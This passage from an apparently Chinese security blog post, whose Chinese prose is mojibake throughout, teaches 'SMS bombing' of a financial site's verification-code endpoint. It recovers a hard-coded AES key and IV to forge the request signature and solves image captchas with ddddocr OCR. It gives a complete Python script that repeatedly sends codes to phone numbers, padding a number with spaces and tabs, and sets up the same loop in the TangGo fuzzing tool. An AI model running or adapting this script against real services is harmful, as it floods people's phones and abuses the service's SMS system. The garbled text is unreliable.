åï¼Œä¼šå‘æ‰‹æœºå·å‘é€çŸ­ä¿¡éªŒè¯ç ï¼Œå…·ä½“æ•°æ®åŒ…å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012225780.png" alt="image.png"> </p><h2 id="å‚æ•°åˆ†æ"><a href="#å‚æ•°åˆ†æ" class="headerlink" title="å‚æ•°åˆ†æ"></a>å‚æ•°åˆ†æ</h2><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012226267.png" alt="image.png"> </p><p>å¯¹æ¯”ä¸Šå›¾ï¼Œå…±æœ‰5ä¸ªå‚æ•°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mobile_telï¼š13888888888</span><br><span class="line">image_codeï¼š5321</span><br><span class="line">signature_dataï¼šM3IC7p1kH5bMMebPjl9H66rsZ+nf3rtYwMk8pUB9fPY=</span><br><span class="line">serial_noï¼š738454630727417856</span><br><span class="line">org_code: ZYGJ001</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ signature_data çš„å€¼å¯ä»¥çœ‹åˆ°æ˜¯ç»è¿‡åŠ å¯†åçš„ï¼Œä¸‹é¢å…ˆè¯´ä¸€ä¸‹signature_dataå‚æ•°çš„é€†å‘åˆ†æã€‚</p><h3 id="signature-data"><a href="#signature-data" class="headerlink" title="signature_data"></a>signature_data</h3><p>å…¨å±€å…³é”®å­—æœç´¢ï¼Œå®šä½åˆ°signature_dataä½ç½®</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012226786.png" alt="image.png"> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">signature_data ï¼št</span><br><span class="line"></span><br><span class="line">t = Object(h[&quot;a&quot;])(&quot;2&quot;.concat(this.mobile, &quot;random&quot;))</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012226542.png" alt="image.png"> </p><p>å…¶ä¸­ â€œObject(h[â€œaâ€])â€ æ˜¯å‡½æ•°åï¼Œâ€2â€.concat(this.mobile, â€œrandomâ€)æ˜¯å‚æ•°å€¼</p><p>å‡è®¾æ‰‹æœºå·ä¸ºï¼š13888888888ï¼Œåˆ™å‚æ•°å€¼ä¸º 213888888888random</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012227812.png" alt="image.png"> </p><p>å¾ˆæ˜æ˜¾çš„AESç‰¹å¾ï¼Œåˆæ­¥åˆ¤æ–­è¿™å—çš„éªŒç­¾ä½¿ç”¨çš„æ˜¯AESåŠ å¯†ã€‚</p><p>ä¸‹é¢å°±æ˜¯è°ƒè¯•å‡ºkey å’Œ iv çš„å€¼ï¼š</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params">t</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> e = l.<span class="property">a</span>.<span class="title function_">parse</span>(<span class="variable language_">window</span>.<span class="property">LOCAL_CONFIG</span>.<span class="property">AES_KEY</span>)</span><br><span class="line">    , n = l.<span class="property">a</span>.<span class="title function_">parse</span>(<span class="variable language_">window</span>.<span class="property">LOCAL_CONFIG</span>.<span class="property">AES_IV</span>)</span><br><span class="line">    , i = l.<span class="property">a</span>.<span class="title function_">parse</span>(t)</span><br><span class="line">    , a = s.<span class="property">a</span>.<span class="title function_">encrypt</span>(i, e, &#123;</span><br><span class="line">      <span class="attr">iv</span>: n,</span><br><span class="line">      <span class="attr">mode</span>: d.<span class="property">a</span>.<span class="property">mode</span>.<span class="property">CBC</span>,</span><br><span class="line">      <span class="attr">padding</span>: g.<span class="property">a</span></span><br><span class="line">    &#125;);</span><br><span class="line">  <span class="keyword">return</span> r.<span class="property">a</span>.<span class="title function_">stringify</span>(a.<span class="property">ciphertext</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012227283.png" alt="image.png"> </p><p>keyï¼šqwertyuiopasdfghã€</p><p>ivï¼šqwertyuiopasdfgh</p><p>ä½¿ç”¨åœ¨çº¿å·¥å…·éªŒè¯ï¼Œç»“æœå’Œä¸Šé¢çš„ä¸€æ ·ï¼Œå‚æ•°åˆ†æç»“æŸ</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012227137.png" alt="img"> </p><p>Pythonè„šæœ¬è®¡ç®—signature_dataï¼š</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    key = <span class="string">&#x27;qwertyuiopasdfgh&#x27;</span></span><br><span class="line">    iv = <span class="string">&#x27;qwertyuiopasdfgh&#x27;</span></span><br><span class="line">    key = key.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    iv = iv.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    data = <span class="built_in">str</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    data = base64.encodebytes(AES.new(key=key, iv=iv, mode=AES.MODE_CBC).encrypt(pad(data, <span class="number">16</span>, style=<span class="string">&#x27;pkcs7&#x27;</span>)))</span><br><span class="line">    <span class="keyword">return</span> data.decode(<span class="string">&#x27;utf-8&#x27;</span>).strip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genSign</span>(<span class="params">phone</span>):</span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&#x27;2&#x27;</span> + phone + <span class="string">&#x27;random&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> encrypt(<span class="built_in">str</span>)</span><br></pre></td></tr></table></figure><h3 id="serial-no"><a href="#serial-no" class="headerlink" title="serial_no"></a>serial_no</h3><p>serial_noï¼š738454630727417856</p><p>ä¸€ä¸²æ•°å­—ï¼Œæ„Ÿè§‰åº”è¯¥å’ŒåŠ è§£å¯†æ²¡å•¥å…³ç³»ã€‚</p><p>æ¨æµ‹åº”è¯¥æ˜¯å›¾ç‰‡éªŒè¯ç ç¼–å·ã€‚ä¸€äº›é‡‘èæœºæ„éƒ½æ¯”è¾ƒå·ï¼ŒæœåŠ¡ç«¯æ¯æ¬¡ç”Ÿæˆå›¾ç‰‡éªŒè¯ç ï¼Œä¼šåŒæ—¶ç”Ÿæˆä¸€ä¸ªç¼–å·ï¼Œè¯¥ç¼–å·ä¼šéšç€ä¸‹ä¸€æ¬¡è¯·æ±‚å’Œå›¾ç‰‡éªŒè¯ç ä¸€å—å‘é€åˆ°æœåŠ¡ç«¯ï¼Œå¦‚æœä¸¤è€…ç›¸å¯¹åº”ï¼Œåˆ™æ ¡éªŒé€šè¿‡ï¼›å¦‚æœä¸å¯¹åº”ï¼Œåˆ™å¤±è´¥ï¼</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012227216.png" alt="img"> </p><p>ä¸€çœ‹æ•°æ®åŒ…ï¼Œæœç„¶å¦‚æ­¤ã€‚</p><h3 id="org-code"><a href="#org-code" class="headerlink" title="org_code"></a>org_code</h3><p>åˆ†æåï¼Œå‘ç°è¯¥å‚æ•°åœ¨å‰ç«¯é…ç½®æ–‡ä»¶ä¸­å†™æ­»äº†ï¼Œæ²¡å•¥åˆ†æçš„å¿…è¦</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012228958.png" alt="img"> </p><p>åˆ°è¿™é‡Œï¼Œ5ä¸ªå‚æ•°å…¶å®éƒ½å·²ç»ç¡®å®šäº†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mobile_telï¼šæ‰‹æœºå·</span><br><span class="line">image_codeï¼šå›¾ç‰‡éªŒè¯ç </span><br><span class="line">signature_dataï¼šAESåŠ å¯†åçš„sign</span><br><span class="line">serial_noï¼šå›¾ç‰‡éªŒè¯ç ç¼–å·</span><br><span class="line">org_code: ä¸šåŠ¡å‚æ•°ï¼Œå›ºå®šä¸ºZYGJ001</span><br></pre></td></tr></table></figure><h2 id="Pythonè„šæœ¬å®ç°è‡ªåŠ¨åŒ–"><a href="#Pythonè„šæœ¬å®ç°è‡ªåŠ¨åŒ–" class="headerlink" title="Pythonè„šæœ¬å®ç°è‡ªåŠ¨åŒ–"></a>Pythonè„šæœ¬å®ç°è‡ªåŠ¨åŒ–</h2><p>è·å¾—å„ä¸ªå‚æ•°</p><ul><li>æ‰‹æœºå·ï¼šæ‰‹åŠ¨è¾“å…¥</li><li>å›¾ç‰‡éªŒè¯ç ï¼šURLè·å–ï¼Œä½¿ç”¨æ­£åˆ™æå–å¤„å›¾ç‰‡çš„Base64ï¼Œå†ä½¿ç”¨dddocræ¥è¯†åˆ«</li><li>signature_dataï¼šAESåŠ å¯†</li><li>serial_noï¼šURLè·å–ï¼Œä½¿ç”¨æ­£åˆ™æå–å‡ºserial_no</li><li>org_code: å›ºå®šä¸ºZYGJ001</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time: 2024-05-11 14:43</span></span><br><span class="line"><span class="comment"># @Author: muhe</span></span><br><span class="line"><span class="comment"># @File: SMS_bur.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> ddddocr <span class="keyword">import</span> DdddOcr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    key = <span class="string">&#x27;qwertyuiopasdfgh&#x27;</span></span><br><span class="line">    iv = <span class="string">&#x27;qwertyuiopasdfgh&#x27;</span></span><br><span class="line">    key = key.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    iv = iv.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    data = <span class="built_in">str</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    data = base64.encodebytes(AES.new(key=key, iv=iv, mode=AES.MODE_CBC).encrypt(pad(data, <span class="number">16</span>, style=<span class="string">&#x27;pkcs7&#x27;</span>)))</span><br><span class="line">    <span class="keyword">return</span> data.decode(<span class="string">&#x27;utf-8&#x27;</span>).strip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genSign</span>(<span class="params">phone</span>):</span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&#x27;2&#x27;</span> + phone + <span class="string">&#x27;random&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> encrypt(<span class="built_in">str</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getCode</span>():</span><br><span class="line">    url = <span class="string">&#x27;å›¾ç‰‡éªŒè¯ç æ¥å£&#x27;</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;image_width&#x27;</span>: <span class="number">88</span>,</span><br><span class="line">        <span class="string">&#x27;image_height&#x27;</span>: <span class="number">34</span>,</span><br><span class="line">        <span class="string">&#x27;image_code_length&#x27;</span>: <span class="number">4</span>,</span><br><span class="line">        <span class="string">&#x27;org_code&#x27;</span>: <span class="string">&#x27;ZYGJ001&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(url, data=data)</span><br><span class="line">    <span class="comment"># print(response.text)</span></span><br><span class="line">    <span class="comment"># æ­£åˆ™æå–è¿”å›åŒ…ä¸­çš„serial_noå‚æ•°</span></span><br><span class="line">    pattern = <span class="string">r&#x27;&quot;serial_no&quot;:&quot;(\d+)&quot;&#x27;</span></span><br><span class="line">    <span class="keyword">match</span> = re.search(pattern, response.text)</span><br><span class="line">    serial_no = <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ­£åˆ™æå–å¤„è¿”å›åŒ…ä¸­çš„base64å›¾ç‰‡</span></span><br><span class="line">    pattern = <span class="string">r&#x27;&quot;image_data&quot;:&quot;data:image/png;base64,([^&quot;]+)&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">match</span> = re.search(pattern, response.text)</span><br><span class="line">    captcha_code = <span class="keyword">match</span>.group(<span class="number">1</span>).strip(<span class="string">&#x27;&quot;&#x27;</span>).replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="comment"># print(captcha_code)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># with open(&#x27;captcha.png&#x27;, &#x27;wb&#x27;) as f:</span></span><br><span class="line">    <span class="comment">#     f.write(base64.b64decode(captcha_code))</span></span><br><span class="line">    <span class="comment"># # è°ƒç”¨ddddocrè¯†åˆ«</span></span><br><span class="line">    <span class="comment"># ocr = DdddOcr()</span></span><br><span class="line">    <span class="comment"># with open(&#x27;captcha.png&#x27;, &#x27;rb&#x27;) as f:</span></span><br><span class="line">    <span class="comment">#     img = f.read()</span></span><br><span class="line">    <span class="comment"># code = ocr.classification(img)</span></span><br><span class="line">    <span class="comment"># return code</span></span><br><span class="line">    ocr = DdddOcr()</span><br><span class="line">    code = ocr.classification(base64.b64decode(captcha_code))</span><br><span class="line">    <span class="keyword">return</span> code, serial_no</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendsms</span>(<span class="params">phone</span>):</span><br><span class="line">    url = <span class="string">&#x27;å‘é€çŸ­ä¿¡æ¥å£&#x27;</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;busin_type&#x27;</span>: <span class="number">2</span>,</span><br><span class="line">        <span class="string">&#x27;mobile_tel&#x27;</span>: phone,</span><br><span class="line">        <span class="string">&#x27;image_code&#x27;</span>: code,</span><br><span class="line">        <span class="string">&#x27;signature_data&#x27;</span>: genSign(phone),</span><br><span class="line">        <span class="string">&#x27;random_str&#x27;</span>: <span class="string">&#x27;random&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;serial_no&#x27;</span>: no,</span><br><span class="line">        <span class="string">&#x27;org_code&#x27;</span>: <span class="string">&#x27;ZYGJ001&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(url, data=data)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># phone = input(&quot;è¯·è¾“å…¥éœ€è¦å‘é€éªŒè¯ç çš„æ‰‹æœºå·:&quot;)</span></span><br><span class="line">    phones = [<span class="string">&quot;13888888888&quot;</span>,<span class="string">&quot;13888888888 &quot;</span>,<span class="string">&quot;13888888888\t&quot;</span>]</span><br><span class="line">    <span class="comment"># signature = genSign()</span></span><br><span class="line">    <span class="comment"># print(signature)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(phones)):</span><br><span class="line">        code, no = getCode()  <span class="comment"># (&#x27;1524&#x27;, &#x27;731541934316728320&#x27;)</span></span><br><span class="line">        sendsms(phones[i])</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="ä¸‰ã€æ¡ˆä¾‹äºŒ"><a href="#ä¸‰ã€æ¡ˆä¾‹äºŒ" class="headerlink" title="ä¸‰ã€æ¡ˆä¾‹äºŒ"></a>ä¸‰ã€æ¡ˆä¾‹äºŒ</h1><p>å¸¸è§„æ¥è¯´æ¶‰åŠåˆ°åŠ è§£å¯†çš„ï¼Œå¯ä»¥ä½¿ç”¨Pythonè„šæœ¬æ¥æ¨¡æ‹Ÿæ‰§è¡Œï¼Œæ¯”è¾ƒæ–¹ä¾¿ã€‚ã€‚ã€‚</p><p>ä½†ä¹Ÿæœ‰ä¸€äº›ç«™ç‚¹ï¼Œæœ¬èº«æ˜¯ä¸æ¶‰åŠåŠ è§£å¯†çš„ï¼Œè¿™æ ·æƒ…å†µä¸‹ï¼Œæ¯æ¬¡éƒ½è¦å†™è„šæœ¬æ¥åšæ¯”è¾ƒæµªè´¹æ—¶é—´ï¼Œä¹Ÿä¸åˆ’ç®—ã€‚</p><p>æœ‰ä»€ä¹ˆç®€ä¾¿æ–¹æ³•å—ï¼Ÿï¼Ÿï¼Ÿç­”æ¡ˆå½“ç„¶æ˜¯æœ‰çš„ï¼</p><h2 id="ç®€å•ä»‹ç»-1"><a href="#ç®€å•ä»‹ç»-1" class="headerlink" title="ç®€å•ä»‹ç»"></a>ç®€å•ä»‹ç»</h2><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012229554.png" alt="img"> </p><p>1ã€é¦–å…ˆï¼Œåˆ·æ–°éªŒè¯ç ï¼ŒæŠ“ä¸ªåŒ…ç®€å•çœ‹ä¸€ä¸‹ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012229520.png" alt="img"> </p><p>å’Œä¸Šä¸€ä¸ªæ¡ˆä¾‹ç±»ä¼¼ï¼Œéƒ½æ˜¯è¿”å›äº†éªŒè¯ç å›¾ç‰‡çš„base64å’ŒéªŒè¯ç ç¼–å·</p><p>2ã€è¾“å…¥æ‰‹æœºå·å’ŒéªŒè¯ç ï¼ŒæŠ“åŒ…æŸ¥çœ‹å‚æ•°ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012229666.png" alt="image.png"> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">OS: &quot;IOS&quot;</span><br><span class="line">code: &quot;0567&quot;</span><br><span class="line">codeId: &quot;034675&quot;</span><br><span class="line">deviceId: &quot;randomDeviceId&quot;</span><br><span class="line">loginName: &quot;13888888888&quot;</span><br><span class="line">orgNumber: &quot;1168&quot;</span><br><span class="line">version: &quot;1.0.0&quot;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­åªæœ‰ â€œcodeâ€ã€â€codeIdâ€ã€â€loginNameâ€æ˜¯å¯å˜çš„ï¼Œå‰©ä¸‹å‚æ•°éƒ½æ˜¯å›ºå®šçš„ã€‚</p><p>å¹¶ä¸” â€œcodeâ€å’Œâ€codeIdâ€ æ˜¯éªŒè¯ç è·å–çš„æ¥å£è¿”å›çš„ã€‚</p><h2 id="dddocr-TangGo"><a href="#dddocr-TangGo" class="headerlink" title="dddocr+TangGo"></a>dddocr+TangGo</h2><h3 id="dddocr"><a href="#dddocr" class="headerlink" title="dddocr"></a>dddocr</h3><p>é¦–å…ˆï¼ŒburpæŠ“åŒ…ï¼Œå€Ÿç”¨capture-killeræ’ä»¶å®ç°éªŒè¯ç è¯†åˆ«</p><p>è¿™å—åŒæ ·ï¼Œç¼–å†™Pythonè„šæœ¬ï¼Œä½¿ç”¨Flashå¼€å¯webæœåŠ¡ï¼Œè°ƒç”¨dddocrå®ç°è¯†åˆ«ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012229780.png" alt="img"> </p><p>è¯†åˆ«æˆåŠŸç‡100%ï¼ï¼ï¼</p><h3 id="TangGo"><a href="#TangGo" class="headerlink" title="TangGo"></a>TangGo</h3><p>ä½†è¦å®ç°çŸ­çº¿è½°ç‚¸ï¼Œè¿˜éœ€è¦æå–å‡ºéªŒè¯ç çš„IDã€‚ã€‚ã€‚</p><p>è¿™å—æ¨èä¸€æ¬¾æ–°å·¥å…·ï¼Œ<strong>TangGO</strong> æµ‹è¯•å·¥å…·æ¥è¿›è¡Œæå–å›¾å½¢éªŒè¯ç çš„IDä»¥åŠimgå†…å®¹æ¥çˆ†ç ´</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># å·¥å…·ä¸‹è½½åœ°å€</span><br><span class="line">https://tanggo.nosugar.tech/#/</span><br></pre></td></tr></table></figure><p>1ã€æ‰“å¼€TangGoï¼Œæ‰¾åˆ°æ¨¡ç³Šæµ‹è¯•å·¥å…·æ¨¡å—</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012230336.png" alt="img"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012230741.png" alt="image.png"> </p><p>2ã€æ‰“å¼€åï¼Œæ‰¾åˆ°ã€è‡ªå®šä¹‰æµç¨‹ã€‘æ¨¡å—ï¼Œæ–°å»ºçŸ­ä¿¡è½°ç‚¸æ•°æ®åŒ…å‘é€å‰çš„æ“ä½œæµç¨‹</p><p><strong>ï¼ˆ1ï¼‰æµç¨‹ä¸€ï¼šè·å–éªŒè¯ç æ•°æ®åŒ…</strong></p><p>å°†è·å–åˆ°çš„å“åº”åŒ…æ•°æ®ç»‘å®šåˆ°å˜é‡ â€œ<strong>get_yzm</strong>â€œï¼ˆè¿™è¾¹å˜é‡åé¢ä¼šç”¨åˆ°ï¼‰ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407111631368.png" alt="image-20240711163134263">  </p><p>æµ‹è¯•ï¼ŒæˆåŠŸè·å–åˆ°äº†å“åº”æ•°æ®åŒ…</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012230382.png" alt="img"> </p><p><strong>ï¼ˆ2ï¼‰æµç¨‹äºŒï¼šæå–æµç¨‹ä¸€ä¸­çš„ image å’Œ id</strong></p><p>â‘ æ–°å»ºæµç¨‹ä¹‹å‰ï¼Œå…ˆè·å–åˆ°æµç¨‹ä¸€ä¸­imageå’Œidæå–å¯¹åº”çš„æ­£åˆ™è¡¨è¾¾å¼ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012231971.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012231056.png" alt="image.png"> </p><p>å³é”®é€‰ä¸­è¦æå–çš„å†…å®¹çš„æ­£åˆ™</p><p>å¦‚è·å–idå€¼ï¼š</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/2167914/1717237921456-20c5682d-30ef-4008-aafa-869dac3207fe.png" alt="img"> </p><p>ç®€å•æµ‹è¯•ï¼ŒæˆåŠŸè·å–åˆ°idå€¼ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012231065.png" alt="img"> </p><p>è¿™å—é€‰æ‹©ç¬¬ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼š (?&lt;&#x3D;:{â€œidâ€:â€œ).*?(?&#x3D;â€,â€œimage)</p><p>åŒç†ï¼Œå¯ä»¥è·å–åˆ°imageçš„å€¼ï¼Œæ­£åˆ™è¡¨è¾¾å¼ä¸ºï¼š(?&lt;&#x3D;,â€imageâ€:â€œ).*?(?&#x3D;â€})</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">idï¼š(?&lt;=\:\&#123;&quot;id&quot;\:&quot;).*?(?=&quot;\,&quot;image)</span><br><span class="line">imageï¼š(?&lt;=,&quot;image&quot;\:&quot;).*?(?=&quot;\&#125;)</span><br></pre></td></tr></table></figure><p>â‘¡ æ–°å»ºæµç¨‹ï¼Œè·å–image</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012231336.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012231734.png" alt="image.png"> </p><p>â‘¢æ–°å»ºæµç¨‹ï¼Œè·å–id</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012232756.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012232025.png" alt="img"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012232789.png" alt="image.png"> </p><p>ï¼ˆ3ï¼‰æµç¨‹ä¸‰ï¼šè°ƒç”¨dddocrå¯¹imageè¿›è¡Œè¯†åˆ«</p><p>1ã€é¦–å…ˆï¼Œç®€å•ä»‹ç»ä¸€ä¸‹dddocrï¼Œå®ƒæ˜¯Pythonçš„ä¸€ä¸ªç¬¬ä¸‰æ–¹åº“ï¼Œå¯ä»¥å®ç°å¯¹å›¾ç‰‡å†…å®¹çš„è¯†åˆ«</p><p>æ”¯æŒå¥½å¤šç§æ–¹å¼è¯†åˆ«ï¼š</p><ul><li>ç›´æ¥å¯¹å›¾ç‰‡æ–‡ä»¶è¿›è¡Œè¯†åˆ«</li><li>å¯¹ä¼ å…¥çš„å›¾ç‰‡base64ç¼–ç è¯†åˆ«ï¼ˆè¿™å—ä¹Ÿæ˜¯åœ¨è¿™å—è¦ä½¿ç”¨çš„ï¼‰</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ddddocr <span class="keyword">import</span> DdddOcr</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    base64_str = <span class="string">&quot;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